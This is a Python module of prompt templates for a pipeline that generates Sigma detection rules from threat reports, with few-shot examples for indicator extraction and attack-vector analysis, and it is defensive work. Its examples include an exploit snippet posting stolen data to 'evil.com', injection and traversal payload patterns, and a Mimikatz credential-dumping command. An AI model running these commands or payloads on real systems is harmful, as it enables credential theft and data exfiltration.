"""
Prompt templates for each pipeline stage.
Each prompt follows LLMCloudHunter principles:
- Role assignment
- Few-shot examples
- Structured JSON output instructions
- Focused, stage-specific scope
"""

# --- Stage 0: Intent Classification ---

INTENT_CLASSIFICATION = """You are a classification system for a Sigma rule generation assistant.

Classify the user's message into one of these intents:
- "generate_rule": The user wants to create a new Sigma detection rule (describes an attack, technique, or threat)
- "refine_rule": The user wants to modify, improve, or fix a previously generated rule
- "question": The user is asking a question about Sigma rules, detection, or cybersecurity
- "chat": The user is greeting, chatting, or the message is unrelated to security

### Conversation History
{history}

### Current Message
{message}

### Examples

Input: "Detect mimikatz credential dumping via LSASS memory access"
Output: {{"intent": "generate_rule", "reasoning": "User wants to detect a specific attack technique"}}

Input: "Can you add a filter for the admin account in that rule?"
Output: {{"intent": "refine_rule", "reasoning": "User wants to modify the previously generated rule"}}

Input: "What log source should I use for network connections?"
Output: {{"intent": "question", "reasoning": "User is asking for guidance, not requesting a rule"}}

Input: "Hello, how are you?"
Output: {{"intent": "chat", "reasoning": "User is greeting"}}

Respond with JSON only."""


# --- Stage 1: Image Transcription ---

IMAGE_TRANSCRIPTION = """You are a cybersecurity image analyst. Examine this image and extract all technical content relevant to threat detection.

Focus on extracting:
- Command lines, scripts, or code snippets
- Log entries or event data
- IP addresses, domain names, file paths
- Process names, service names
- Error messages or security alerts
- Network diagrams or architecture details
- Any indicators of compromise (IoCs)

If the image contains non-technical content (logos, decorative art, marketing), respond with: {{"is_technical": false, "transcription": ""}}

Otherwise, provide a detailed transcription in this JSON format:
{{"is_technical": true, "transcription": "<extracted technical content as text>"}}

Context from the user's message: {context}

Respond with JSON only."""


# --- Stage 2: Entity/Indicator Extraction ---

ENTITY_EXTRACTION = """You are a cybersecurity threat intelligence analyst specializing in indicator extraction from attack descriptions.

Analyze the following text and extract ALL threat indicators that could be used for building detection rules.

### Text to Analyze
{text}

### Extract these indicator types:
- **process**: Process or executable names (e.g., mimikatz.exe, powershell.exe, cmd.exe)
- **command_line**: Specific command-line patterns or arguments (e.g., "-dumpcreds", "Invoke-Mimikatz")
- **file_path**: File paths or filenames (e.g., C:\\Windows\\Temp\\payload.exe, /etc/shadow)
- **registry_key**: Windows registry keys or values
- **ip_address**: IP addresses (IPv4/IPv6)
- **domain**: Domain names or URLs
- **port**: Network ports
- **user_agent**: HTTP user agent strings
- **api_call**: Windows API calls or cloud API calls (e.g., VirtualAlloc, GetObject)
- **tool_name**: Known attack tools or malware names (e.g., Cobalt Strike, Mimikatz, BloodHound)
- **event_id**: Log event IDs (e.g., Sysmon Event ID 1, Windows Event ID 4688)
- **hash**: File hashes (MD5, SHA1, SHA256)
- **service_name**: Windows service names or cloud service names
- **other**: Any other relevant indicator

### Few-shot Examples

**Input**: "The attacker used mimikatz to dump LSASS memory. They ran sekurlsa::logonpasswords from C:\\Temp\\mimi.exe"
**Output**:
{{
  "indicators": [
    {{"value": "mimikatz", "type": "tool_name", "context": "attacker used mimikatz to dump LSASS memory", "confidence": "high"}},
    {{"value": "lsass.exe", "type": "process", "context": "dump LSASS memory", "confidence": "high"}},
    {{"value": "sekurlsa::logonpasswords", "type": "command_line", "context": "ran sekurlsa::logonpasswords", "confidence": "high"}},
    {{"value": "C:\\\\Temp\\\\mimi.exe", "type": "file_path", "context": "ran from C:\\\\Temp\\\\mimi.exe", "confidence": "high"}},
    {{"value": "mimi.exe", "type": "process", "context": "executable name mimi.exe", "confidence": "high"}}
  ],
  "attack_summary": "Credential dumping attack using Mimikatz tool to extract logon passwords from LSASS process memory.",
  "suggested_log_sources": ["sysmon", "windows_security"]
}}

**Input**: "Attackers performed lateral movement using PsExec to create a remote service on port 445. They connected from 10.0.0.5 to 10.0.0.20."
**Output**:
{{
  "indicators": [
    {{"value": "psexec.exe", "type": "process", "context": "lateral movement using PsExec", "confidence": "high"}},
    {{"value": "PsExec", "type": "tool_name", "context": "lateral movement using PsExec", "confidence": "high"}},
    {{"value": "445", "type": "port", "context": "create a remote service on port 445", "confidence": "high"}},
    {{"value": "10.0.0.5", "type": "ip_address", "context": "connected from 10.0.0.5", "confidence": "high"}},
    {{"value": "10.0.0.20", "type": "ip_address", "context": "connected to 10.0.0.20", "confidence": "high"}}
  ],
  "attack_summary": "Lateral movement using PsExec tool to execute commands on remote systems via SMB port 445.",
  "suggested_log_sources": ["sysmon", "windows_security", "windows_system"]
}}

Be thorough - extract BOTH explicitly mentioned AND implicitly referenced indicators.
Respond with JSON only."""


# --- Stage 3: TTP Mapping ---

TTP_MAPPING = """You are a MITRE ATT&CK classification expert. Map the following attack indicators and summary to the most relevant MITRE ATT&CK techniques.

### Attack Summary
{attack_summary}

### Extracted Indicators
{indicators}

### Reference MITRE ATT&CK Context (from knowledge base)
{mitre_context}

### Instructions
1. Map each relevant attack behavior to specific MITRE ATT&CK techniques
2. Use the full technique ID including sub-techniques where applicable (e.g., T1003.001, not just T1003)
3. Assign a severity level based on the potential impact
4. Focus on techniques that are directly evidenced by the indicators, not speculative

### Few-shot Examples

**Input Summary**: "Credential dumping using Mimikatz targeting LSASS"
**Output**:
{{
  "mappings": [
    {{
      "technique_id": "T1003.001",
      "technique_name": "OS Credential Dumping: LSASS Memory",
      "tactic": "Credential Access",
      "relevance": "Mimikatz sekurlsa::logonpasswords directly dumps credentials from LSASS process memory",
      "severity": "high"
    }}
  ]
}}

**Input Summary**: "Lateral movement via PsExec creating remote services"
**Output**:
{{
  "mappings": [
    {{
      "technique_id": "T1021.002",
      "technique_name": "Remote Services: SMB/Windows Admin Shares",
      "tactic": "Lateral Movement",
      "relevance": "PsExec uses SMB admin shares to copy and execute files on remote systems",
      "severity": "high"
    }},
    {{
      "technique_id": "T1569.002",
      "technique_name": "System Services: Service Execution",
      "tactic": "Execution",
      "relevance": "PsExec creates a temporary service on the remote system to execute commands",
      "severity": "medium"
    }}
  ]
}}

Respond with JSON only."""


# --- Stage 4: Rule Generation ---

RULE_GENERATION = """You are an expert Sigma rule author. Generate detection rules based on the analyzed threat intelligence below.

### Current Date: {current_date}

### Primary Attack Vector (anchor at least ONE rule on this)
{attack_vector_summary}

### Payload Signatures (strings/patterns a real attacker MUST produce — prefer these in detection)
{payload_signatures}

### Strings that must NOT drive detection (researcher/patch workflow artifacts)
{incidental_blacklist}

### Attack Summary
{attack_summary}

### Extracted Threat Indicators
{indicators}

### MITRE ATT&CK Mappings (analyst-suggested; validate against the MITRE context below)
{ttp_mappings}

### Similar Existing Sigma Rules (for reference)
{sigma_context}

### Relevant Log Source Information
{sysmon_context}

{logsource_taxonomy_context}

{cwe_context}

{mitre_context}

{kill_chain_requirement}

{coverage_feedback}

### Conversation History (for refinement context)
{history}

### Reference URLs (include in each rule's references field)
{references}

### User's Original Request
{user_query}

### Instructions
1. Generate one or more Sigma rules that detect the described attack behavior.
2. **At least one rule MUST target the PRIMARY ATTACK VECTOR** — i.e. match on the attacker-controlled input, entry point, or payload signatures. If the primary vector is a network request (HTTP/WebSocket/SMB/DNS), the logsource of that rule must match the telemetry where that traffic is observed. Initial-access detection is MANDATORY when an exploit is described.
3. Prefer the supplied "Payload Signatures" as detection criteria over arbitrary strings from the text. These are the patterns a real attacker cannot avoid.
4. **NEVER** use any string from "Strings that must NOT drive detection" as a detection criterion. Those are patch-analysis / researcher-workflow artifacts and would never fire in a real attack.
5. **FIELD VALIDITY — DERIVE EVERY FIELD NAME FROM THE SIGMA LOGSOURCE TAXONOMY ABOVE.** Every field you put in `detection:` MUST be a field that the taxonomy block describes as existing for the chosen (category, product, service) triple. General rules that always apply:
    - A field is valid only if it is documented in the retrieved taxonomy for the logsource you choose. If the taxonomy does not confirm a field exists for that logsource, DO NOT use it — pick a different logsource or a different indicator.
    - Path and query-string are distinct fields in HTTP logs. A path segment must go into the field that holds the request path; a query-string token must go into the field that holds the query string. Verify which is which from the taxonomy.
    - If the indicator lives inside a request body, response body, header, or cookie, verify from the taxonomy whether the chosen logsource actually captures that data. If it does not, switch to a logsource that does (e.g. a WAF, reverse proxy, or application log) OR pick a different indicator visible in the current logsource.
    - Do NOT invent `service:` values. Use only service names consistent with the taxonomy for the chosen (category, product) pair, or omit the field.
    - Do NOT include a `version:` field in `logsource:` unless the LOG FORMAT itself differs between versions (very rare). NEVER copy the affected or patched PRODUCT version into `logsource.version`.
6. **MITRE TTPs MUST BE SEMANTICALLY JUSTIFIED BY THE MITRE/CWE CONTEXT ABOVE.** For every technique you tag, the retrieved MITRE description for that technique must be consistent with the actual attack mechanics (vulnerability class, protocol, attacker-controlled input). Do not pick a TTP because its name sounds related — read its description. If the description talks about a different attack surface, technology, or phase of the kill chain than the one evidenced here, pick a different TTP.
7. **MULTI-STAGE EXPLOITS MUST BE MULTIPLE RULES.** If the kill-chain section above lists N stages, produce AT LEAST N rules — one per stage. Do not AND indicators from different requests/stages into a single `all of selection_*` condition (they cannot co-occur in the same log line).
8. Each rule MUST include: title, id (valid UUID), status, description, references, author, date, tags, logsource, detection, falsepositives, level.
9. The "references" field MUST be a YAML list of URLs. Include ALL relevant URLs from the Reference URLs section above, plus the MITRE ATT&CK technique URL for each rule's target TTP.
10. Author MUST be "Sigma Assistant". Date MUST be "{current_date}".
11. Tags MUST use `attack.tXXXX` for MITRE techniques (lowercase technique id) and `attack.<tactic_name>` for tactics — pick only techniques you can justify from the MITRE context above.
12. Include specific detection criteria based on the extracted indicators; small details improve specificity.

### Few-shot Example

**Input**: Attack using mimikatz targeting LSASS, indicators: mimikatz.exe, lsass.exe, sekurlsa::logonpasswords
**Output**:
{{
  "rules": [
    {{
      "yaml_content": "title: Mimikatz Credential Dumping via LSASS Access\\nid: 12345678-1234-1234-1234-123456789abc\\nstatus: experimental\\ndescription: Detects potential credential dumping using Mimikatz by monitoring for suspicious access to the LSASS process.\\nreferences:\\n    - https://attack.mitre.org/techniques/T1003/001/\\n    - https://www.rapid7.com/blog/post/2022/mimikatz-analysis/\\nauthor: Sigma Assistant\\ndate: {current_date}\\ntags:\\n    - attack.credential_access\\n    - attack.t1003.001\\nlogsource:\\n    category: process_access\\n    product: windows\\ndetection:\\n    selection:\\n        TargetImage|endswith: '\\\\lsass.exe'\\n        SourceImage|endswith:\\n            - '\\\\mimikatz.exe'\\n            - '\\\\mimi.exe'\\n        GrantedAccess|contains:\\n            - '0x1010'\\n            - '0x1410'\\n    condition: selection\\nfalsepositives:\\n    - Legitimate security scanning tools\\n    - Antivirus software accessing LSASS\\nlevel: high",
      "explanation": "This rule detects Mimikatz credential dumping by monitoring process access events targeting LSASS with suspicious access rights.",
      "target_ttp": "T1003.001"
    }}
  ],
  "notes": ""
}}

Respond with JSON only."""


# --- Stage 5: Validation (LLM semantic review) ---

RULE_VALIDATION = """You are a Sigma rule quality reviewer. Review the following Sigma rule(s) for logical correctness and detection effectiveness.

### Generated Rules
{rules}

### Original Attack Description
{attack_summary}

### Extracted Indicators
{indicators}

### Check for these issues:
1. **Field name correctness**: Are the field names valid for the specified log source? (e.g., Sysmon uses 'Image', 'CommandLine', 'TargetFilename'; Windows Security uses 'ProcessName', 'SubjectUserName')
2. **Detection logic**: Does the detection logic actually detect the described attack? Are there logical errors?
3. **Condition syntax**: Is the condition field correctly referencing the selection names?
4. **Completeness**: Are important indicators missing from the detection?
5. **Over-specificity**: Is the rule too specific to be useful (e.g., hardcoded temp file names)?
6. **Under-specificity**: Is the rule too broad and will generate excessive false positives?

For each rule, report any issues found. If a rule has errors, provide the corrected YAML.

Respond with JSON in this format:
{{
  "is_valid": true/false,
  "issues": [
    {{"severity": "error|warning|info", "field": "field_name", "message": "description"}}
  ],
  "corrected_rules": ["corrected yaml if needed, or original yaml if no changes"]
}}

Respond with JSON only."""


# --- Stage 6: Optimization ---

RULE_OPTIMIZATION = """You are a Sigma rule optimization expert. Improve the following validated Sigma rules.

### Rules to Optimize
{rules}

### Extracted IoCs (for enrichment)
{iocs}

### Perform these optimizations:
1. **Selection Unification**: If multiple selection criteria share the same filtering logic, merge them into one selection
2. **Selection Separation**: If a selection contains unrelated detection criteria, split them into separate selections with OR logic
3. **IoC Enrichment**: If relevant IP addresses, domains, or user agents were extracted, add them as OPTIONAL detection filters using additional selection fields and OR logic in the condition (e.g., `selection and (selection_ioc_ip or selection_ioc_domain)` becomes `selection or (selection and selection_ioc_ip)`)
4. **False Positive Refinement**: Add reasonable false positive entries if missing
5. **Deduplication**: If multiple rules detect the same behavior, keep only the most comprehensive one

### IoC Enrichment Example
If IPs [10.0.0.5] were extracted, add:
```
selection_ioc_ip:
    SourceIP:
        - '10.0.0.5'
```
And update condition from `selection` to `selection and selection_ioc_ip` or keep IoCs as optional with `selection or (selection and selection_ioc_ip)`

### Instructions
- Only make changes that genuinely improve detection quality
- If no optimizations are needed, return rules unchanged with empty changes_made
- Preserve the original detection intent
- IoCs should be added as OPTIONAL filters (analysts can remove them)

Respond with JSON:
{{
  "rules": [
    {{
      "yaml_content": "the optimized YAML",
      "changes_made": ["list of changes made to this rule"]
    }}
  ],
  "summary": "brief summary of all optimizations"
}}

Respond with JSON only."""


# --- Web Search Query Extraction (Improvement 1) ---

WEB_SEARCH_QUERIES = """You are a cybersecurity research assistant. Given the user's input about a threat or vulnerability, generate 2-3 targeted web search queries that would find additional technical details useful for building a detection rule.

### User Input
{text}

### Instructions
- Focus on finding: CVE details, exploit PoC code, IoCs, detection guidance, log analysis
- If a CVE ID is mentioned, always include it in a query
- If a malware/tool name is mentioned, search for its technical analysis
- Prefer searches that will return technical writeups, not news articles
- Keep queries concise and specific

### Examples

**Input**: "Detect CVE-2024-1234 exploitation in Apache Struts"
**Output**:
{{
  "queries": [
    "CVE-2024-1234 Apache Struts exploit PoC indicators of compromise",
    "CVE-2024-1234 detection Sigma YARA rule",
    "Apache Struts CVE-2024-1234 log analysis forensics"
  ]
}}

**Input**: "Create a rule to detect Cobalt Strike beacon activity"
**Output**:
{{
  "queries": [
    "Cobalt Strike beacon detection indicators network traffic",
    "Cobalt Strike named pipe process injection Sigma rule",
    "Cobalt Strike malleable C2 profile forensic artifacts"
  ]
}}

Respond with JSON only."""


# --- Log Source Suggestion (Improvement 2) ---

LOG_SOURCE_SUGGESTION = """You are a Sigma rule log source expert. Given the extracted indicators and MITRE ATT&CK mappings, determine the most appropriate log sources for detection.

### Attack Summary
{attack_summary}

### Extracted Indicators
{indicators}

### MITRE ATT&CK Mappings
{ttp_mappings}

### Reference: Common Sigma Log Source Categories and Fields

| Category | Product | Service | Typical Fields |
|----------|---------|---------|----------------|
| process_creation | windows | sysmon | Image, CommandLine, ParentImage, ParentCommandLine, User, IntegrityLevel |
| process_creation | windows | security | NewProcessName, CommandLine, ParentProcessName, SubjectUserName |
| process_creation | linux | auditd | exe, comm, a0, a1, ppid, uid |
| process_access | windows | sysmon | SourceImage, TargetImage, GrantedAccess, CallTrace |
| file_event | windows | sysmon | TargetFilename, Image, CreationUtcTime |
| file_change | windows | sysmon | TargetFilename, Image |
| registry_event | windows | sysmon | TargetObject, Details, Image, EventType |
| network_connection | windows | sysmon | DestinationIp, DestinationPort, SourceIp, Image, Initiated |
| dns_query | windows | sysmon | QueryName, QueryResults, Image |
| image_load | windows | sysmon | ImageLoaded, Image, Signed, SignatureStatus |
| pipe_created | windows | sysmon | PipeName, Image |
| wmi_event | windows | sysmon | EventType, Operation, User |
| ps_script | windows | powershell | ScriptBlockText, ScriptBlockId |
| ps_module | windows | powershell | ContextInfo, Payload |
| webserver | linux/windows | apache/iis/nginx | cs-uri-query, cs-method, c-ip, sc-status |
| firewall | - | - | src_ip, dst_ip, dst_port, action |
| proxy | - | - | cs-host, cs-uri, c-uri-extension, c-useragent |
| cloud | aws | cloudtrail | eventName, eventSource, sourceIPAddress, userIdentity |
| cloud | azure | activitylogs | operationName, callerIpAddress, properties |
| cloud | gcp | audit | methodName, callerIp, serviceName |

### Instructions
1. Analyze the indicators and TTPs to determine WHICH log sources would capture the described behavior
2. Rank suggestions by confidence (how likely this log source captures the attack)
3. Include relevant field names for each suggested log source
4. Consider both primary and secondary detection opportunities
5. The primary_source should be the single best log source for this specific attack

### Example

**Input**: Attack using Mimikatz targeting LSASS memory
**Output**:
{{
  "suggestions": [
    {{
      "category": "process_access",
      "product": "windows",
      "service": "sysmon",
      "confidence": 0.95,
      "reasoning": "LSASS memory access is directly captured by Sysmon Event ID 10 (ProcessAccess) with GrantedAccess flags",
      "relevant_fields": ["SourceImage", "TargetImage", "GrantedAccess", "CallTrace"]
    }},
    {{
      "category": "process_creation",
      "product": "windows",
      "service": "sysmon",
      "confidence": 0.8,
      "reasoning": "Mimikatz process execution would be captured by process creation events",
      "relevant_fields": ["Image", "CommandLine", "ParentImage"]
    }}
  ],
  "primary_source": "process_access (Sysmon Event ID 10)"
}}

Respond with JSON only."""


# --- PoC Code Analysis (Improvement 4) ---

POC_CODE_ANALYSIS = """You are a cybersecurity exploit analyst. Analyze the following code snippet(s) and extract behavioral indicators that could be used for detection in security logs.

### Code Snippet(s)
{code_snippets}

### Instructions
Focus on OBSERVABLE BEHAVIORS that would appear in logs, not the code logic itself:
1. **Processes spawned**: Any system commands, executables, or shells invoked
2. **Commands executed**: Specific command-line arguments or patterns
3. **Files created/modified/deleted**: File paths, temporary files, dropped payloads
4. **Network connections**: Outbound connections, URLs, IPs, ports, protocols
5. **Registry modifications**: Registry keys created or modified
6. **API calls**: Notable Windows API calls (VirtualAlloc, CreateRemoteThread, etc.)
7. **Service operations**: Services created, modified, or started
8. **Evasion techniques**: Process injection, hollowing, encoding, obfuscation methods

### Example

**Input Code**:
```python
import subprocess
subprocess.Popen(["powershell", "-enc", encoded_payload])
os.makedirs("C:\\\\Windows\\\\Temp\\\\svc")
requests.post("http://evil.com:8443/beacon", data=exfil_data)
```

**Output**:
{{
  "behavioral_indicators": [
    {{"value": "powershell.exe", "type": "process", "context": "PowerShell spawned by Python exploit", "confidence": "high"}},
    {{"value": "-enc", "type": "command_line", "context": "Encoded PowerShell command execution - common evasion", "confidence": "high"}},
    {{"value": "C:\\\\Windows\\\\Temp\\\\svc", "type": "file_path", "context": "Suspicious directory created in Windows Temp", "confidence": "high"}},
    {{"value": "evil.com", "type": "domain", "context": "C2 callback domain", "confidence": "high"}},
    {{"value": "8443", "type": "port", "context": "Non-standard HTTPS port for C2 beacon", "confidence": "medium"}}
  ],
  "attack_flow": "The exploit spawns PowerShell with an encoded payload, creates a staging directory in Windows Temp, and exfiltrates data to a C2 server over port 8443."
}}

Be thorough - extract every observable behavior from the code. If you cannot determine the language or the code is obfuscated, still extract what you can.
Respond with JSON only."""


# --- Conversational Response (for chat/question intents) ---

CONVERSATIONAL = """You are a helpful Sigma Rule Assistant. You help security analysts create detection rules.

Current Date: {current_date}

### Conversation History
{history}

### User Message
{message}

### Knowledge Base Context
**Similar Rules:** {sigma_context}
**MITRE:** {mitre_context}
**Sysmon:** {sysmon_context}

Respond naturally and helpfully. If the user is asking about detection or Sigma rules, provide useful guidance. If they're greeting you, be friendly and offer to help with Sigma rule creation."""


# --- Attack Vector Extraction (anchoring stage) ---
# Runs BEFORE combined analysis. Forces the pipeline to explicitly identify the
# primary attack vector before any IOC extraction, so downstream stages don't
# over-index on incidental strings (patch-analysis artifacts, background color,
# researcher workflow, etc.).
#
# Generic by design: uses CWE categories + MITRE tactics, no CVE-specific logic.

ATTACK_VECTOR_EXTRACTION = """You are a vulnerability analyst. Your single job is to identify the PRIMARY ATTACK VECTOR in the supplied threat-intel text, independent of any specific CVE or product.

Vulnerability write-ups routinely mix four very different categories of content:
 (A) The actual exploit — what the attacker sends / does to trigger the bug.
 (B) Post-exploitation behavior — what happens after successful exploitation.
 (C) Researcher / defender workflow — patch-diffing, binary reversing, sandbox setup, debugger output.
 (D) Background — product overview, historical CVEs, marketing copy, unrelated examples.

Downstream stages will build Sigma rules from whatever strings they see. If they
cannot tell (A) from (C), they will generate rules that fire on the researcher's
workflow instead of the attacker's activity. Your job is to label every piece of
evidence so that does not happen.

### Input Text
{text}

### Known Code Behaviors (from PoC analysis, may be empty)
{poc_behaviors}

---

## Output — one JSON object with these fields

### 1. Primary attack vector (REQUIRED)
- `initial_access_vector`: One-sentence description of HOW the attacker first interacts with the target. Focus on the attacker-visible surface (e.g. "unauthenticated HTTP POST to /saml/login with a crafted SAMLRequest body", "WebSocket handshake to /nginx with command-injection in remoteVersion parameter", "SMB NULL session against named pipe", "malicious Office document with macro", "local user-mode write to kernel device"). If multiple vectors exist, pick the one the write-up emphasizes.
- `protocol`: One of `http`, `https`, `websocket`, `smb`, `rdp`, `dns`, `ldap`, `ssh`, `rpc`, `kerberos`, `local`, `physical`, `email`, `other`, `unknown`.
- `entry_point`: The concrete endpoint/surface the attacker targets (URL path, named pipe, device file, RPC interface, registry key, UI action...). Empty string if not inferrable.
- `attacker_controlled_input`: What the attacker actually controls (HTTP parameter name, header name, file field, command-line arg, request body). Empty string if not inferrable.
- `preconditions`: One of `unauthenticated`, `authenticated_low_priv`, `authenticated_admin`, `local_user`, `physical_access`, `social_engineering`, `unknown`.

### 2. Vulnerability class (REQUIRED)
- `vuln_class`: Best-fit CWE-style category. Pick ONE from: `command_injection`, `sql_injection`, `path_traversal`, `deserialization`, `xxe`, `ssrf`, `xss`, `csrf`, `auth_bypass`, `privilege_escalation`, `memory_corruption` (buffer/heap/stack overflow, UAF), `memory_disclosure` (OOB read, info leak), `race_condition`, `integer_overflow`, `crypto_weakness`, `file_upload`, `template_injection`, `prototype_pollution`, `supply_chain`, `misconfiguration`, `other`.
- `cwe_hint`: Best-matching CWE ID as a string like `"CWE-78"`, or empty string if unsure.
- `cvss_attack_vector`: One of `AV:N` (network), `AV:A` (adjacent network), `AV:L` (local), `AV:P` (physical), `unknown`.

### 3. Payload signatures (REQUIRED — what rules should match)
- `payload_signatures`: List of 1-8 concrete, observable strings/patterns that would appear in telemetry DURING EXPLOITATION. Each item has:
  - `pattern`: The literal string or simple regex (e.g. `"SAMLRequest=asdf"`, `"remoteVersion=a[$("`, `"$(nslookup"`, `"'; DROP TABLE"`, `"../../etc/passwd"`, `"rO0AB"`).
  - `where`: Where this pattern would be observed. One of `request_uri`, `request_body`, `request_header`, `response_body`, `response_header`, `process_cmdline`, `file_content`, `network_payload`, `dns_query`, `other`.
  - `derived_from`: Short quote (<=120 chars) from the input text or PoC that justifies this pattern. If derived from vuln class (e.g. generic deserialization magic bytes), write `"inferred_from_class"`.

These drive the actual detection logic. Prefer patterns that real attackers MUST produce, not patterns that only appear in the specific PoC transcript.

### 4. Telemetry surfaces (REQUIRED)
- `primary_telemetry`: Where the initial exploit would be visible. One of `web_proxy`, `webserver_access_log`, `waf`, `network_ids`, `firewall`, `dns`, `process_creation`, `file_event`, `registry_event`, `cloud_audit`, `email_gateway`, `auth_log`, `other`.
- `secondary_telemetry`: List of additional log sources that would see follow-on activity (post-exploit). Same vocabulary as above.

### 5. Kill-chain coverage (REQUIRED)
- `kill_chain_stages`: List of MITRE ATT&CK tactics evidenced in the text. Choose from: `reconnaissance`, `resource_development`, `initial_access`, `execution`, `persistence`, `privilege_escalation`, `defense_evasion`, `credential_access`, `discovery`, `lateral_movement`, `collection`, `command_and_control`, `exfiltration`, `impact`. The list MUST contain `initial_access` if the write-up describes an exploit.

### 6. Incidental strings (REQUIRED — anti-hallucination filter)
- `incidental_artifacts`: List of strings/filenames/commands that appear in the input text but are NOT part of the attack itself. Typical categories:
  - Patch-diff / reverse-engineering filenames (e.g. `"BT26-02-RS.nss"`, hardcoded patch passwords, internal build identifiers)
  - Debugger / sandbox setup (`"gdb"`, `"qemu"`, `"strace"`, `"IDA"`)
  - Researcher's lab infrastructure (their personal domains, test VM hostnames)
  - Screenshots of unrelated software, background product history
  - Commands only the researcher would run, not the attacker
  Each item: `{{"value": "...", "reason": "why this is researcher/defender workflow, not attacker activity"}}`.
  Downstream stages will BLACKLIST these from rule generation. Be aggressive — false positives here only reduce noise, false negatives here cause bad rules.

### 7. Confidence
- `confidence`: Float 0.0-1.0 reflecting how clearly the write-up describes the initial attack vector. Below 0.5 means the text is mostly post-mortem or background and downstream stages should be cautious.
- `reasoning`: 1-2 sentences explaining the confidence score and any ambiguity.

---

### Few-shot Examples

**Example A (memory disclosure over HTTP):**
Input mentions: unauthenticated POST to /saml/login with oversized SAMLRequest triggering out-of-bounds read, leaked memory returned in NSC_TASS cookie, vendor's patch analysis with file "patch.nss".
Output (abbreviated):
{{
  "initial_access_vector": "Unauthenticated HTTP POST to /saml/login with oversized/malformed SAMLRequest body triggering out-of-bounds read",
  "protocol": "https",
  "entry_point": "/saml/login",
  "attacker_controlled_input": "SAMLRequest POST parameter",
  "preconditions": "unauthenticated",
  "vuln_class": "memory_disclosure",
  "cwe_hint": "CWE-125",
  "cvss_attack_vector": "AV:N",
  "payload_signatures": [
    {{"pattern": "POST /saml/login", "where": "request_uri", "derived_from": "unauthenticated POST to the SAML endpoint"}},
    {{"pattern": "SAMLRequest=", "where": "request_body", "derived_from": "attacker-controlled SAMLRequest parameter"}},
    {{"pattern": "NSC_TASS=", "where": "response_header", "derived_from": "leaked memory returned in session cookie"}}
  ],
  "primary_telemetry": "webserver_access_log",
  "secondary_telemetry": ["web_proxy", "network_ids"],
  "kill_chain_stages": ["initial_access", "collection"],
  "incidental_artifacts": [
    {{"value": "patch.nss", "reason": "vendor patch file analyzed by researchers, never touched by attackers"}}
  ],
  "confidence": 0.85,
  "reasoning": "Write-up includes a clear PoC request and a concrete leaked-data signature."
}}

**Example B (command injection over WebSocket with heavy patch analysis in the article):**
Input mentions: WebSocket /nginx, remoteVersion query param passed to bash arithmetic, patch BT26-02 decrypted with hardcoded password, thin-scc-wrapper binary replaced by sed script.
Output (abbreviated):
{{
  "initial_access_vector": "Unauthenticated WebSocket handshake to /nginx with bash command-substitution in remoteVersion parameter",
  "protocol": "websocket",
  "entry_point": "/nginx (WebSocket upgrade)",
  "attacker_controlled_input": "remoteVersion query parameter",
  "preconditions": "unauthenticated",
  "vuln_class": "command_injection",
  "cwe_hint": "CWE-78",
  "cvss_attack_vector": "AV:N",
  "payload_signatures": [
    {{"pattern": "remoteVersion=", "where": "request_uri", "derived_from": "attacker-controlled remoteVersion param"}},
    {{"pattern": "$(", "where": "request_uri", "derived_from": "bash command substitution"}},
    {{"pattern": "`", "where": "request_uri", "derived_from": "alternate bash substitution"}},
    {{"pattern": "Upgrade: websocket", "where": "request_header", "derived_from": "WebSocket handshake"}}
  ],
  "primary_telemetry": "webserver_access_log",
  "secondary_telemetry": ["process_creation", "network_ids"],
  "kill_chain_stages": ["initial_access", "execution"],
  "incidental_artifacts": [
    {{"value": "BT26-02-RS.nss", "reason": "vendor patch filename used during patch-diffing, not part of attack"}},
    {{"value": "Bingb0ng, what she said; the Tw1st3d switch is RED", "reason": "hardcoded patch decryption password, used by researchers/defenders not attackers"}},
    {{"value": "sedcp", "reason": "shell helper inside vendor's own patch script, not attacker TTP"}},
    {{"value": "thin-scc-wrapper replacement via sed", "reason": "vendor patch mechanism, not attacker behavior"}},
    {{"value": "bt26-02.sh", "reason": "vendor's patch installer script"}}
  ],
  "confidence": 0.75,
  "reasoning": "Article devotes significant space to patch analysis; the exploit itself is described more abstractly but PoC snippets confirm the injection vector."
}}

**Example C (local process_creation attack, no network component):**
Input mentions: local low-priv user runs setuid binary `/usr/bin/oopsie` with crafted env var PATH to trigger library hijack.
Output (abbreviated):
{{
  "initial_access_vector": "Local low-privileged user executes vulnerable setuid binary with crafted PATH environment variable",
  "protocol": "local",
  "entry_point": "/usr/bin/oopsie",
  "attacker_controlled_input": "PATH environment variable",
  "preconditions": "authenticated_low_priv",
  "vuln_class": "privilege_escalation",
  "cwe_hint": "CWE-427",
  "cvss_attack_vector": "AV:L",
  "payload_signatures": [
    {{"pattern": "/usr/bin/oopsie", "where": "process_cmdline", "derived_from": "target setuid binary"}},
    {{"pattern": "PATH=", "where": "process_cmdline", "derived_from": "PATH hijack"}}
  ],
  "primary_telemetry": "process_creation",
  "secondary_telemetry": ["file_event", "auth_log"],
  "kill_chain_stages": ["privilege_escalation", "execution"],
  "incidental_artifacts": [],
  "confidence": 0.9,
  "reasoning": "Straightforward local priv-esc with clear setuid binary and env-var abuse."
}}

---

Output JSON only, no commentary."""


# --- Combined Analysis (Extraction + TTP Mapping + Log Source) ---
# Single call replaces 3 separate stages to reduce API usage.

COMBINED_ANALYSIS = """You are a cybersecurity threat intelligence analyst, MITRE ATT&CK classification expert, and Sigma log source specialist.

Perform a comprehensive analysis of the following text in THREE parts within a single response.

### Text to Analyze
{text}

### Primary Attack Vector (from prior stage — anchor everything to this)
{attack_vector_summary}

### Strings to EXCLUDE from indicator extraction (researcher/patch workflow, not attacker activity)
{incidental_blacklist}

### Reference MITRE ATT&CK Context (from knowledge base)
{mitre_context}

---

## PART 1: Entity/Indicator Extraction

Extract ALL threat indicators from the text:
- **process**: Process or executable names (e.g., mimikatz.exe, powershell.exe)
- **command_line**: Specific command-line patterns or arguments
- **file_path**: File paths or filenames
- **registry_key**: Windows registry keys or values
- **ip_address**: IP addresses (IPv4/IPv6)
- **domain**: Domain names or URLs
- **port**: Network ports
- **user_agent**: HTTP user agent strings
- **api_call**: Windows API calls or cloud API calls
- **tool_name**: Known attack tools or malware names
- **event_id**: Log event IDs
- **hash**: File hashes (MD5, SHA1, SHA256)
- **service_name**: Windows/cloud service names
- **other**: Any other relevant indicator

Be thorough - extract BOTH explicitly mentioned AND implicitly referenced indicators.
Each indicator needs: value, type, context (brief quote), confidence (high/medium/low).

IMPORTANT: Skip any indicator whose value matches (or is a substring of) an entry in the
"Strings to EXCLUDE" list above — those describe researcher/defender workflow, not attacker
activity, and must not drive detection logic. Prioritize indicators that support the
"Primary Attack Vector" described above.

